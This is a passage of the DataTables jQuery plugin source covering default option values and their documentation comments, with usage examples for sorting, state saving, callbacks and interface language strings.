		 *    $(document).ready( function () {

		 *      $('#example').dataTable( {

		 *        "serverSide": true,

		 *        "ajax": "xhr.php"

		 *      } );

		 *    } );

		 */

		"bServerSide": false,

	

	

		/**

		 * Enable or disable sorting of columns. Sorting of individual columns can be

		 * disabled by the `sortable` option for each column.

		 *  @type boolean

		 *  @default true

		 *

		 *  @dtopt Features

		 *  @name DataTable.defaults.ordering

		 *

		 *  @example

		 *    $(document).ready( function () {

		 *      $('#example').dataTable( {

		 *        "ordering": false

		 *      } );

		 *    } );

		 */

		"bSort": true,

	

	

		/**

		 * Enable or display DataTables' ability to sort multiple columns at the

		 * same time (activated by shift-click by the user).

		 *  @type boolean

		 *  @default true

		 *

		 *  @dtopt Options

		 *  @name DataTable.defaults.orderMulti

		 *

		 *  @example

		 *    // Disable multiple column sorting ability

		 *    $(document).ready( function () {

		 *      $('#example').dataTable( {

		 *        "orderMulti": false

		 *      } );

		 *    } );

		 */

		"bSortMulti": true,

	

	

		/**

		 * Allows control over whether DataTables should use the top (true) unique

		 * cell that is found for a single column, or the bottom (false - default).

		 * This is useful when using complex headers.

		 *  @type boolean

		 *  @default false

		 *

		 *  @dtopt Options

		 *  @name DataTable.defaults.orderCellsTop

		 *

		 *  @example

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "orderCellsTop": true

		 *      } );

		 *    } );

		 */

		"bSortCellsTop": false,

	

	

		/**

		 * Enable or disable the addition of the classes `sorting\_1`, `sorting\_2` and

		 * `sorting\_3` to the columns which are currently being sorted on. This is

		 * presented as a feature switch as it can increase processing time (while

		 * classes are removed and added) so for large data sets you might want to

		 * turn this off.

		 *  @type boolean

		 *  @default true

		 *

		 *  @dtopt Features

		 *  @name DataTable.defaults.orderClasses

		 *

		 *  @example

		 *    $(document).ready( function () {

		 *      $('#example').dataTable( {

		 *        "orderClasses": false

		 *      } );

		 *    } );

		 */

		"bSortClasses": true,

	

	

		/**

		 * Enable or disable state saving. When enabled HTML5 `localStorage` will be

		 * used to save table display information such as pagination information,

		 * display length, filtering and sorting. As such when the end user reloads

		 * the page the display display will match what thy had previously set up.

		 *

		 * Due to the use of `localStorage` the default state saving is not supported

		 * in IE6 or 7. If state saving is required in those browsers, use

		 * `stateSaveCallback` to provide a storage solution such as cookies.

		 *  @type boolean

		 *  @default false

		 *

		 *  @dtopt Features

		 *  @name DataTable.defaults.stateSave

		 *

		 *  @example

		 *    $(document).ready( function () {

		 *      $('#example').dataTable( {

		 *        "stateSave": true

		 *      } );

		 *    } );

		 */

		"bStateSave": false,

	

	

		/**

		 * This function is called when a TR element is created (and all TD child

		 * elements have been inserted), or registered if using a DOM source, allowing

		 * manipulation of the TR element (adding classes etc).

		 *  @type function

		 *  @param {node} row "TR" element for the current row

		 *  @param {array} data Raw data array for this row

		 *  @param {int} dataIndex The index of this row in the internal aoData array

		 *

		 *  @dtopt Callbacks

		 *  @name DataTable.defaults.createdRow

		 *

		 *  @example

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "createdRow": function( row, data, dataIndex ) {

		 *          // Bold the grade for all 'A' grade browsers

		 *          if ( data[4] == "A" )

		 *          {

		 *            $('td:eq(4)', row).html( '<b>A</b>' );

		 *          }

		 *        }

		 *      } );

		 *    } );

		 */

		"fnCreatedRow": null,

	

	

		/**

		 * This function is called on every 'draw' event, and allows you to

		 * dynamically modify any aspect you want about the created DOM.

		 *  @type function

		 *  @param {object} settings DataTables settings object

		 *

		 *  @dtopt Callbacks

		 *  @name DataTable.defaults.drawCallback

		 *

		 *  @example

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "drawCallback": function( settings ) {

		 *          alert( 'DataTables has redrawn the table' );

		 *        }

		 *      } );

		 *    } );

		 */

		"fnDrawCallback": null,

	

	

		/**

		 * Identical to fnHeaderCallback() but for the table footer this function

		 * allows you to modify the table footer on every 'draw' event.

		 *  @type function

		 *  @param {node} foot "TR" element for the footer

		 *  @param {array} data Full table data (as derived from the original HTML)

		 *  @param {int} start Index for the current display starting point in the

		 *    display array

		 *  @param {int} end Index for the current display ending point in the

		 *    display array

		 *  @param {array int} display Index array to translate the visual position

		 *    to the full data array

		 *

		 *  @dtopt Callbacks

		 *  @name DataTable.defaults.footerCallback

		 *

		 *  @example

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "footerCallback": function( tfoot, data, start, end, display ) {

		 *          tfoot.getElementsByTagName('th')[0].innerHTML = "Starting index is "+start;

		 *        }

		 *      } );

		 *    } )

		 */

		"fnFooterCallback": null,

	

	

		/**

		 * When rendering large numbers in the information element for the table

		 * (i.e. "Showing 1 to 10 of 57 entries") DataTables will render large numbers

		 * to have a comma separator for the 'thousands' units (e.g. 1 million is

		 * rendered as "1,000,000") to help readability for the end user. This

		 * function will override the default method DataTables uses.

		 *  @type function

		 *  @member

		 *  @param {int} toFormat number to be formatted

		 *  @returns {string} formatted string for DataTables to show the number

		 *

		 *  @dtopt Callbacks

		 *  @name DataTable.defaults.formatNumber

		 *

		 *  @example

		 *    // Format a number using a single quote for the separator (note that

		 *    // this can also be done with the language.thousands option)

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "formatNumber": function ( toFormat ) {

		 *          return toFormat.toString().replace(

		 *            /\B(?=(\d{3})+(?!\d))/g, "'"

		 *          );

		 *        };

		 *      } );

		 *    } );

		 */

		"fnFormatNumber": function ( toFormat ) {

			return toFormat.toString().replace(

				/\B(?=(\d{3})+(?!\d))/g,

				this.oLanguage.sThousands

			);

		},

	

	

		/**

		 * This function is called on every 'draw' event, and allows you to

		 * dynamically modify the header row. This can be used to calculate and

		 * display useful information about the table.

		 *  @type function

		 *  @param {node} head "TR" element for the header

		 *  @param {array} data Full table data (as derived from the original HTML)

		 *  @param {int} start Index for the current display starting point in the

		 *    display array

		 *  @param {int} end Index for the current display ending point in the

		 *    display array

		 *  @param {array int} display Index array to translate the visual position

		 *    to the full data array

		 *

		 *  @dtopt Callbacks

		 *  @name DataTable.defaults.headerCallback

		 *

		 *  @example

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "fheaderCallback": function( head, data, start, end, display ) {

		 *          head.getElementsByTagName('th')[0].innerHTML = "Displaying "+(end-start)+" records";

		 *        }

		 *      } );

		 *    } )

		 */

		"fnHeaderCallback": null,

	

	

		/**

		 * The information element can be used to convey information about the current

		 * state of the table. Although the internationalisation options presented by

		 * DataTables are quite capable of dealing with most customisations, there may

		 * be times where you wish to customise the string further. This callback

		 * allows you to do exactly that.

		 *  @type function

		 *  @param {object} oSettings DataTables settings object

		 *  @param {int} start Starting position in data for the draw

		 *  @param {int} end End position in data for the draw

		 *  @param {int} max Total number of rows in the table (regardless of

		 *    filtering)

		 *  @param {int} total Total number of rows in the data set, after filtering

		 *  @param {string} pre The string that DataTables has formatted using it's

		 *    own rules

		 *  @returns {string} The string to be displayed in the information element.

		 *

		 *  @dtopt Callbacks

		 *  @name DataTable.defaults.infoCallback

		 *

		 *  @example

		 *    $('#example').dataTable( {

		 *      "infoCallback": function( settings, start, end, max, total, pre ) {

		 *        return start +" to "+ end;

		 *      }

		 *    } );

		 */

		"fnInfoCallback": null,

	

	

		/**

		 * Called when the table has been initialised. Normally DataTables will

		 * initialise sequentially and there will be no need for this function,

		 * however, this does not hold true when using external language information

		 * since that is obtained using an async XHR call.

		 *  @type function

		 *  @param {object} settings DataTables settings object

		 *  @param {object} json The JSON object request from the server - only

		 *    present if client-side Ajax sourced data is used

		 *

		 *  @dtopt Callbacks

		 *  @name DataTable.defaults.initComplete

		 *

		 *  @example

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "initComplete": function(settings, json) {

		 *          alert( 'DataTables has finished its initialisation.' );

		 *        }

		 *      } );

		 *    } )

		 */

		"fnInitComplete": null,

	

	

		/**

		 * Called at the very start of each table draw and can be used to cancel the

		 * draw by returning false, any other return (including undefined) results in

		 * the full draw occurring).

		 *  @type function

		 *  @param {object} settings DataTables settings object

		 *  @returns {boolean} False will cancel the draw, anything else (including no

		 *    return) will allow it to complete.

		 *

		 *  @dtopt Callbacks

		 *  @name DataTable.defaults.preDrawCallback

		 *

		 *  @example

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "preDrawCallback": function( settings ) {

		 *          if ( $('#test').val() == 1 ) {

		 *            return false;

		 *          }

		 *        }

		 *      } );

		 *    } );

		 */

		"fnPreDrawCallback": null,

	

	

		/**

		 * This function allows you to 'post process' each row after it have been

		 * generated for each table draw, but before it is rendered on screen. This

		 * function might be used for setting the row class name etc.

		 *  @type function

		 *  @param {node} row "TR" element for the current row

		 *  @param {array} data Raw data array for this row

		 *  @param {int} displayIndex The display index for the current table draw

		 *  @param {int} displayIndexFull The index of the data in the full list of

		 *    rows (after filtering)

		 *

		 *  @dtopt Callbacks

		 *  @name DataTable.defaults.rowCallback

		 *

		 *  @example

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "rowCallback": function( row, data, displayIndex, displayIndexFull ) {

		 *          // Bold the grade for all 'A' grade browsers

		 *          if ( data[4] == "A" ) {

		 *            $('td:eq(4)', row).html( '<b>A</b>' );

		 *          }

		 *        }

		 *      } );

		 *    } );

		 */

		"fnRowCallback": null,

	

	

		/**

		 * __Deprecated__ The functionality provided by this parameter has now been

		 * superseded by that provided through `ajax`, which should be used instead.

		 *

		 * This parameter allows you to override the default function which obtains

		 * the data from the server so something more suitable for your application.

		 * For example you could use POST data, or pull information from a Gears or

		 * AIR database.

		 *  @type function

		 *  @member

		 *  @param {string} source HTTP source to obtain the data from (`ajax`)

		 *  @param {array} data A key/value pair object containing the data to send

		 *    to the server

		 *  @param {function} callback to be called on completion of the data get

		 *    process that will draw the data on the page.

		 *  @param {object} settings DataTables settings object

		 *

		 *  @dtopt Callbacks

		 *  @dtopt Server-side

		 *  @name DataTable.defaults.serverData

		 *

		 *  @deprecated 1.10. Please use `ajax` for this functionality now.

		 */

		"fnServerData": null,

	

	

		/**

		 * __Deprecated__ The functionality provided by this parameter has now been

		 * superseded by that provided through `ajax`, which should be used instead.

		 *

		 *  It is often useful to send extra data to the server when making an Ajax

		 * request - for example custom filtering information, and this callback

		 * function makes it trivial to send extra information to the server. The

		 * passed in parameter is the data set that has been constructed by

		 * DataTables, and you can add to this or modify it as you require.

		 *  @type function

		 *  @param {array} data Data array (array of objects which are name/value

		 *    pairs) that has been constructed by DataTables and will be sent to the

		 *    server. In the case of Ajax sourced data with server-side processing

		 *    this will be an empty array, for server-side processing there will be a

		 *    significant number of parameters!

		 *  @returns {undefined} Ensure that you modify the data array passed in,

		 *    as this is passed by reference.

		 *

		 *  @dtopt Callbacks

		 *  @dtopt Server-side

		 *  @name DataTable.defaults.serverParams

		 *

		 *  @deprecated 1.10. Please use `ajax` for this functionality now.

		 */

		"fnServerParams": null,

	

	

		/**

		 * Load the table state. With this function you can define from where, and how, the

		 * state of a table is loaded. By default DataTables will load from `localStorage`

		 * but you might wish to use a server-side database or cookies.

		 *  @type function

		 *  @member

		 *  @param {object} settings DataTables settings object

		 *  @param {object} callback Callback that can be executed when done. It

		 *    should be passed the loaded state object.

		 *  @return {object} The DataTables state object to be loaded

		 *

		 *  @dtopt Callbacks

		 *  @name DataTable.defaults.stateLoadCallback

		 *

		 *  @example

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "stateSave": true,

		 *        "stateLoadCallback": function (settings, callback) {

		 *          $.ajax( {

		 *            "url": "/state_load",

		 *            "dataType": "json",

		 *            "success": function (json) {

		 *              callback( json );

		 *            }

		 *          } );

		 *        }

		 *      } );

		 *    } );

		 */

		"fnStateLoadCallback": function ( settings ) {

			try {

				return JSON.parse(

					(settings.iStateDuration === -1 ? sessionStorage : localStorage).getItem(

						'DataTables_'+settings.sInstance+'_'+location.pathname

					)

				);

			} catch (e) {

				return {};

			}

		},

	

	

		/**

		 * Callback which allows modification of the saved state prior to loading that state.

		 * This callback is called when the table is loading state from the stored data, but

		 * prior to the settings object being modified by the saved state. Note that for

		 * plug-in authors, you should use the `stateLoadParams` event to load parameters for

		 * a plug-in.

		 *  @type function

		 *  @param {object} settings DataTables settings object

		 *  @param {object} data The state object that is to be loaded

		 *

		 *  @dtopt Callbacks

		 *  @name DataTable.defaults.stateLoadParams

		 *

		 *  @example

		 *    // Remove a saved filter, so filtering is never loaded

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "stateSave": true,

		 *        "stateLoadParams": function (settings, data) {

		 *          data.oSearch.sSearch = "";

		 *        }

		 *      } );

		 *    } );

		 *

		 *  @example

		 *    // Disallow state loading by returning false

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "stateSave": true,

		 *        "stateLoadParams": function (settings, data) {

		 *          return false;

		 *        }

		 *      } );

		 *    } );

		 */

		"fnStateLoadParams": null,

	

	

		/**

		 * Callback that is called when the state has been loaded from the state saving method

		 * and the DataTables settings object has been modified as a result of the loaded state.

		 *  @type function

		 *  @param {object} settings DataTables settings object

		 *  @param {object} data The state object that was loaded

		 *

		 *  @dtopt Callbacks

		 *  @name DataTable.defaults.stateLoaded

		 *

		 *  @example

		 *    // Show an alert with the filtering value that was saved

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "stateSave": true,

		 *        "stateLoaded": function (settings, data) {

		 *          alert( 'Saved filter was: '+data.oSearch.sSearch );

		 *        }

		 *      } );

		 *    } );

		 */

		"fnStateLoaded": null,

	

	

		/**

		 * Save the table state. This function allows you to define where and how the state

		 * information for the table is stored By default DataTables will use `localStorage`

		 * but you might wish to use a server-side database or cookies.

		 *  @type function

		 *  @member

		 *  @param {object} settings DataTables settings object

		 *  @param {object} data The state object to be saved

		 *

		 *  @dtopt Callbacks

		 *  @name DataTable.defaults.stateSaveCallback

		 *

		 *  @example

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "stateSave": true,

		 *        "stateSaveCallback": function (settings, data) {

		 *          // Send an Ajax request to the server with the state object

		 *          $.ajax( {

		 *            "url": "/state_save",

		 *            "data": data,

		 *            "dataType": "json",

		 *            "method": "POST"

		 *            "success": function () {}

		 *          } );

		 *        }

		 *      } );

		 *    } );

		 */

		"fnStateSaveCallback": function ( settings, data ) {

			try {

				(settings.iStateDuration === -1 ? sessionStorage : localStorage).setItem(

					'DataTables_'+settings.sInstance+'_'+location.pathname,

					JSON.stringify( data )

				);

			} catch (e) {}

		},

	

	

		/**

		 * Callback which allows modification of the state to be saved. Called when the table

		 * has changed state a new state save is required. This method allows modification of

		 * the state saving object prior to actually doing the save, including addition or

		 * other state properties or modification. Note that for plug-in authors, you should

		 * use the `stateSaveParams` event to save parameters for a plug-in.

		 *  @type function

		 *  @param {object} settings DataTables settings object

		 *  @param {object} data The state object to be saved

		 *

		 *  @dtopt Callbacks

		 *  @name DataTable.defaults.stateSaveParams

		 *

		 *  @example

		 *    // Remove a saved filter, so filtering is never saved

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "stateSave": true,

		 *        "stateSaveParams": function (settings, data) {

		 *          data.oSearch.sSearch = "";

		 *        }

		 *      } );

		 *    } );

		 */

		"fnStateSaveParams": null,

	

	

		/**

		 * Duration for which the saved state information is considered valid. After this period

		 * has elapsed the state will be returned to the default.

		 * Value is given in seconds.

		 *  @type int

		 *  @default 7200 <i>(2 hours)</i>

		 *

		 *  @dtopt Options

		 *  @name DataTable.defaults.stateDuration

		 *

		 *  @example

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "stateDuration": 60*60*24; // 1 day

		 *      } );

		 *    } )

		 */

		"iStateDuration": 7200,

	

	

		/**

		 * When enabled DataTables will not make a request to the server for the first

		 * page draw - rather it will use the data already on the page (no sorting etc

		 * will be applied to it), thus saving on an XHR at load time. `deferLoading`

		 * is used to indicate that deferred loading is required, but it is also used

		 * to tell DataTables how many records there are in the full table (allowing

		 * the information element and pagination to be displayed correctly). In the case

		 * where a filtering is applied to the table on initial load, this can be

		 * indicated by giving the parameter as an array, where the first element is

		 * the number of records available after filtering and the second element is the

		 * number of records without filtering (allowing the table information element

		 * to be shown correctly).

		 *  @type int | array

		 *  @default null

		 *

		 *  @dtopt Options

		 *  @name DataTable.defaults.deferLoading

		 *

		 *  @example

		 *    // 57 records available in the table, no filtering applied

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "serverSide": true,

		 *        "ajax": "scripts/server_processing.php",

		 *        "deferLoading": 57

		 *      } );

		 *    } );

		 *

		 *  @example

		 *    // 57 records after filtering, 100 without filtering (an initial filter applied)

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "serverSide": true,

		 *        "ajax": "scripts/server_processing.php",

		 *        "deferLoading": [ 57, 100 ],

		 *        "search": {

		 *          "search": "my_filter"

		 *        }

		 *      } );

		 *    } );

		 */

		"iDeferLoading": null,

	

	

		/**

		 * Number of rows to display on a single page when using pagination. If

		 * feature enabled (`lengthChange`) then the end user will be able to override

		 * this to a custom setting using a pop-up menu.

		 *  @type int

		 *  @default 10

		 *

		 *  @dtopt Options

		 *  @name DataTable.defaults.pageLength

		 *

		 *  @example

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "pageLength": 50

		 *      } );

		 *    } )

		 */

		"iDisplayLength": 10,

	

	

		/**

		 * Define the starting point for data display when using DataTables with

		 * pagination. Note that this parameter is the number of records, rather than

		 * the page number, so if you have 10 records per page and want to start on

		 * the third page, it should be "20".

		 *  @type int

		 *  @default 0

		 *

		 *  @dtopt Options

		 *  @name DataTable.defaults.displayStart

		 *

		 *  @example

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "displayStart": 20

		 *      } );

		 *    } )

		 */

		"iDisplayStart": 0,

	

	

		/**

		 * By default DataTables allows keyboard navigation of the table (sorting, paging,

		 * and filtering) by adding a `tabindex` attribute to the required elements. This

		 * allows you to tab through the controls and press the enter key to activate them.

		 * The tabindex is default 0, meaning that the tab follows the flow of the document.

		 * You can overrule this using this parameter if you wish. Use a value of -1 to

		 * disable built-in keyboard navigation.

		 *  @type int

		 *  @default 0

		 *

		 *  @dtopt Options

		 *  @name DataTable.defaults.tabIndex

		 *

		 *  @example

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "tabIndex": 1

		 *      } );

		 *    } );

		 */

		"iTabIndex": 0,

	

	

		/**

		 * Classes that DataTables assigns to the various components and features

		 * that it adds to the HTML table. This allows classes to be configured

		 * during initialisation in addition to through the static

		 * {@link DataTable.ext.oStdClasses} object).

		 *  @namespace

		 *  @name DataTable.defaults.classes

		 */

		"oClasses": {},

	

	

		/**

		 * All strings that DataTables uses in the user interface that it creates

		 * are defined in this object, allowing you to modified them individually or

		 * completely replace them all as required.

		 *  @namespace

		 *  @name DataTable.defaults.language

		 */

		"oLanguage": {

			/**

			 * Strings that are used for WAI-ARIA labels and controls only (these are not

			 * actually visible on the page, but will be read by screenreaders, and thus

			 * must be internationalised as well).

			 *  @namespace

			 *  @name DataTable.defaults.language.aria

			 */

			"oAria": {

				/**

				 * ARIA label that is added to the table headers when the column may be

				 * sorted ascending by activing the column (click or return when focused).

				 * Note that the column header is prefixed to this string.

				 *  @type string

				 *  @default : activate to sort column ascending

				 *

				 *  @dtopt Language

				 *  @name DataTable.defaults.language.aria.sortAscending

				 *

				 *  @example

				 *    $(document).ready( function() {

				 *      $('#example').dataTable( {

				 *        "language": {

				 *          "aria": {

				 *            "sortAscending": " - click/return to sort ascending"

				 *          }

				 *        }

				 *      } );

				 *    } );

				 */

				"sSortAscending": ": activate to sort column ascending",

	

				/**

				 * ARIA label that is added to the table headers when the column may be

				 * sorted descending by activing the column (click or return when focused).

				 * Note that the column header is prefixed to this string.

				 *  @type string

				 *  @default : activate to sort column ascending

				 *

				 *  @dtopt Language

				 *  @name DataTable.defaults.language.aria.sortDescending

				 *

				 *  @example

				 *    $(document).ready( function() {

				 *      $('#example').dataTable( {

				 *        "language": {

				 *          "aria": {

				 *            "sortDescending": " - click/return to sort descending"

				 *          }

				 *        }

				 *      } );

				 *    } );

				 */

				"sSortDescending": ": activate to sort column descending"

			},

	

			/**

			 * Pagination string used by DataTables for the built-in pagination

			 * control types.

			 *  @namespace

			 *  @name DataTable.defaults.language.paginate

			 */

			"oPaginate": {

				/**

				 * Text to use when using the 'full_numbers' type of pagination for the

				 * button to take the user to the first page.

				 *  @type string

				 *  @default First

				 *

				 *  @dtopt Language

				 *  @name DataTable.defaults.language.paginate.first

				 *

				 *  @example

				 *    $(document).ready( function() {

				 *      $('#example').dataTable( {

				 *        "language": {

				 *          "paginate": {

				 *            "first": "First page"

				 *          }

				 *        }

				 *      } );

				 *    } );

				 */

				"sFirst": "First",

	

	

				/**

				 * Text to use when using the 'full_numbers' type of pagination for the

				 * button to take the user to the last page.

				 *  @type string

				 *  @default Last

				 *

				 *  @dtopt Language

				 *  @name DataTable.defaults.language.paginate.last

				 *

				 *  @example

				 *    $(document).ready( function() {

				 *      $('#example').dataTable( {

				 *        "language": {

				 *          "paginate": {

				 *            "last": "Last page"

				 *          }

				 *        }

				 *      } );

				 *    } );

				 */

				"sLast": "Last",

	

	

				/**

				 * Text to use for the 'next' pagination button (to take the user to the

				 * next page).

				 *  @type string

				 *  @default Next

				 *

				 *  @dtopt Language

				 *  @name DataTable.defaults.language.paginate.next

				 *

				 *  @example

				 *    $(document).ready( function() {

				 *      $('#example').dataTable( {

				 *        "language": {

				 *          "paginate": {

				 *            "next": "Next page"

				 *          }

				 *        }

				 *      } );

				 *    } );

				 */

				"sNext": "Next",

	

	

				/**

				 * Text to use for the 'previous' pagination button (to take the user to

				 * the previous page).

				 *  @type string

				 *  @default Previous

				 *

				 *  @dtopt Language

				 *  @name DataTable.defaults.language.paginate.previous

				 *

				 *  @example

				 *    $(document).ready( function() {

				 *      $('#example').dataTable( {

				 *        "language": {

				 *          "paginate": {

				 *            "previous": "Previous page"

				 *          }

				 *        }

				 *      } );

				 *    } );

				 */

				"sPrevious": "Previous"

			},

	

			/**

			 * This string is shown in preference to `zeroRecords` when the table is

			 * empty of data (regardless of filtering). Note that this is an optional

			 * parameter - if it is not given, the value of `zeroRecords` will be used

			 * instead (either the default or given value).

			 *  @type string

			 *  @default No data available in table

			 *

			 *  @dtopt Language

			 *  @name DataTable.defaults.language.emptyTable

			 *

			 *  @example

			 *    $(document).ready( function() {

			 *      $('#example').dataTable( {

			 *        "language": {

			 *          "emptyTable": "No data available in table"

			 *        }

			 *      } );

			 *    } );

			 */

			"sEmptyTable": "No data available in table",

	

	

			/**

			 * This string gives information to the end user about the information

			 * that is current on display on the page. The following tokens can be

			 * used in the string and will be dynamically replaced as the table

			 * display updates. This tokens can be placed anywhere in the string, or

			 * removed as needed by the language requires:

			 *

			 * * `\_START\_` - Display index of the first record on the current page

			 * * `\_END\_` - Display index of the last record on the current page

			 * * `\_TOTAL\_` - Number of records in the table after filtering

			 * * `\_MAX\_` - Number of records in the table without filtering

			 * * `\_PAGE\_` - Current page number

			 * * `\_PAGES\_` - Total number of pages of data in the table

			 *

			 *  @type string

			 *  @default Showing _START_ to _END_ of _TOTAL_ entries

			 *

			 *  @dtopt Language

			 *  @name DataTable.defaults.language.info

			 *

			 *  @example

			 *    $(document).ready( function() {

			 *      $('#example').dataTable( {

			 *        "language": {

			 *          "info": "Showing page _PAGE_ of _PAGES_"

			 *        }

			 *      } );

			 *    } );

			 */

			"sInfo": "Showing _START_ to _END_ of _TOTAL_ entries",

	

	

			/**

			 * Display information string for when the table is empty. Typically the

			 * format of this string should match `info`.

			 *  @type string

			 *  @default Showing 0 to 0 of 0 entries

			 *

			 *  @dtopt Language

			 *  @name DataTable.defaults.language.infoEmpty

			 *

			 *  @example

			 *    $(document).ready( function() {

			 *      $('#example').dataTable( {

			 *        "language": {

			 *          "infoEmpty": "No entries to show"

			 *        }

			 *      } );

			 *    } );

			 */

			"sInfoEmpty": "Showing 0 to 0 of 0 entries",

	

	

			/**

			 * When a user filters the information in a table, this string is appended

			 * to the information (`info`) to give an idea of how strong the filtering

			 * is. The variable _MAX_ is dynamically updated.

			 *  @type string

			 *  @default (filtered from _MAX_ total entries)

			 *

			 *  @dtopt Language

			 *  @name DataTable.defaults.language.infoFiltered

			 *

			 *  @example

			 *    $(document).ready( function() {

			 *      $('#example').dataTable( {

			 *        "language": {

			 *          "infoFiltered": " - filtering from _MAX_ records"

			 *        }

			 *      } );

			 *    } );

			 */

			"sInfoFiltered": "(filtered from _MAX_ total entries)",

	

	

			/**

			 * If can be useful to append extra information to the info string at times,

			 * and this variable does exactly that. This information will be appended to

			 * the `info` (`infoEmpty` and `infoFiltered` in whatever combination they are

			 * being used) at all times.

			 *  @type string

			 *  @default <i>Empty string</i>

			 *

			 *  @dtopt Language

			 *  @name DataTable.defaults.language.infoPostFix

			 *

			 *  @example

			 *    $(document).ready( function() {

			 *      $('#example').dataTable( {

			 *        "language": {

			 *          "infoPostFix": "All records shown are derived from real information."

			 *        }

			 *      } );

			 *    } );

			 */

			"sInfoPostFix": "",

	

	

			/**

			 * This decimal place operator is a little different from the other

			 * language options since DataTables doesn't output floating point

			 * numbers, so it won't ever use this for display of a number. Rather,

			 * what this parameter does is modify the sort methods of the table so

			 * that numbers which are in a format which has a character other than

			 * a period (`.`) as a decimal place will be sorted numerically.

			 *

			 * Note that numbers with different decimal places cannot be shown in

			 * the same table and still be sortable, the table must be consistent.

			 * However, multiple different tables on the page can use different

			 * decimal place characters.

			 *  @type string

			 *  @default 

			 *

			 *  @dtopt Language

			 *  @name DataTable.defaults.language.decimal

			 *

			 *  @example

			 *    $(document).ready( function() {

			 *      $('#example').dataTable( {

			 *        "language": {

			 *          "decimal": ","

			 *          "thousands": "."

			 *        }

			 *      } );

			 *    } );

			 */

			"sDecimal": "",

	

	

			/**

			 * DataTables has a build in number formatter (`formatNumber`) which is

			 * used to format large numbers that are used in the table information.

			 * By default a comma is used, but this can be trivially changed to any

			 * character you wish with this parameter.

			 *  @type string

			 *  @default ,

			 *

			 *  @dtopt Language

			 *  @name DataTable.defaults.language.thousands

			 *

			 *  @example

			 *    $(document).ready( function() {

			 *      $('#example').dataTable( {

			 *        "language": {

			 *          "thousands": "'"

			 *        }

			 *      } );

			 *    } );

			 */

			"sThousands": ",",

	

	

			/**

			 * Detail the action that will be taken when the drop down menu for the

			 * pagination length option is changed. The '_MENU_' variable is replaced

			 * with a default select list of 10, 25, 50 and 100, and can be replaced

			 * with a custom select box if required.

			 *  @type string

			 *  @default Show _MENU_ entries

			 *

			 *  @dtopt Language

			 *  @name DataTable.defaults.language.lengthMenu

			 *

			 *  @example

			 *    // Language change only

			 *    $(document).ready( function() {

			 *      $('#example').dataTable( {

			 *        "language": {

			 *          "lengthMenu": "Display _MENU_ records"

			 *        }

			 *      } );

			 *    } );

			 *

			 *  @example

			 *    // Language and options change

			 *    $(document).ready( function() {

			 *      $('#example').dataTable( {

			 *        "language": {

			 *          "lengthMenu": 'Display <select>'+

			 *            '<option value="10">10</option>'+

			 *            '<option value="20">20</option>'+

			 *            '<option value="30">30</option>'+

			 *            '<option value="40">40</option>'+

			 *            '<option value="50">50</option>'+

			 *            '<option value="-1">All</option>'+

			 *            '</select> records'

			 *        }

			 *      } );

			 *    } );

			 */

			"sLengthMenu": "Show _MENU_ entries",

	

	

			/**

			 * When using Ajax sourced data and during the first draw when DataTables is

			 * gathering the data, this message is shown in an empty row in the table to

			 * indicate to the end user the the data is being loaded. Note that this

			 * parameter is not used when loading data by server-side processing, just

			 * Ajax sourced data with client-side processing.

			 *  @type string

			 *  @default Loading...

			 *

			 *  @dtopt Language

			 *  @name DataTable.defaults.language.loadingRecords

			 *

			 *  @example

			 *    $(document).ready( function() {

			 *      $('#example').dataTable( {

			 *        "language": {

			 *          "loadingRecords": "Please wait - loading..."

			 *        }

			 *      } );

			 *    } );

			 */

			"sLoadingRecords": "Loading...",

	

	

			/**

			 * Text which is displayed when the table is processing a user action

			 * (usually a sort command or similar).

			 *  @type string

			 *  @default Processing...

			 *

			 *  @dtopt Language

			 *  @name DataTable.defaults.language.processing

			 *

			 *  @example

			 *    $(document).ready( function() {

			 *      $('#example').dataTable( {

			 *        "language": {

			 *          "processing": "DataTables is currently busy"

			 *        }

			 *      } );

			 *    } );

			 */

			"sProcessing": "Processing...",

	

	

			/**

			 * Details the actions that will be taken when the user types into the

			 * filtering input text box. The variable "_INPUT_", if used in the string,

			 * is replaced with the HTML text box for the filtering input allowing

			 * control over where it appears in the string. If "_INPUT_" is not given

			 * then the input box is appended to the string automatically.

			 *  @type string

			 *  @default Search:

			 *

			 *  @dtopt Language

			 *  @name DataTable.defaults.language.search

			 *

			 *  @example

			 *    // Input text box will be appended at the end automatically

			 *    $(document).ready( function() {

			 *      $('#example').dataTable( {

			 *        "language": {

			 *          "search": "Filter records:"

			 *        }

			 *      } );

			 *    } );

			 *

			 *  @example

			 *    // Specify where the filter should appear

			 *    $(document).ready( function() {

			 *      $('#example').dataTable( {

			 *        "language": {

			 *          "search": "Apply filter _INPUT_ to table"

			 *        }

			 *      } );

			 *    } );

			 */

			"sSearch": "Search:",

	

	

			/**

			 * Assign a `placeholder` attribute to the search `input` element

			 *  @type string

			 *  @default 

			 *

			 *  @dtopt Language

			 *  @name DataTable.defaults.language.searchPlaceholder

			 */

			"sSearchPlaceholder": "",

	

	

			/**

			 * All of the language information can be stored in a file on the

			 * server-side, which DataTables will look up if this parameter is passed.

			 * It must store the URL of the language file, which is in a JSON format,

			 * and the object has the same properties as the oLanguage object in the

			 * initialiser object (i.e. the above parameters). Please refer to one of

			 * the example language files to see how this works in action.

			 *  @type string

